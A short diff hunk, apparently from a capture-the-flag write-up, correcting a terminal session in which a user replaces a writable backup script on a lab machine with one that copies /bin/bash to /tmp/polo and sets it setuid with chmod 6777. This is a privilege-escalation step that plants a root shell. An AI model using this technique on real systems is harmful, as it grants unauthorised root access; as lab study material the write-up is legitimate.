@@ -283,7 +283,7 @@ max@race:/usr/local/share/race-scripts$ rm offsite-backup.sh
 rm: remove write-protected regular file 'offsite-backup.sh'? y
 max@race:/usr/local/share/race-scripts$ mkfifo offsite-backup.sh
 max@race:/usr/local/share/race-scripts$ mv offsite-backup.sh pipe
-max@race:/usr/local/share/race-scripts$ echo -e '#!/bin/bash\n\ncp /bin/bash /tmp/0xdf\nchmod 6777 /tmp/polo' | tee offsite-backup.sh
+max@race:/usr/local/share/race-scripts$ echo -e '#!/bin/bash\n\ncp /bin/bash /tmp/polo\nchmod 6777 /tmp/polo' | tee offsite-backup.sh
 #!/bin/bash
 
 cp /bin/bash /tmp/polo
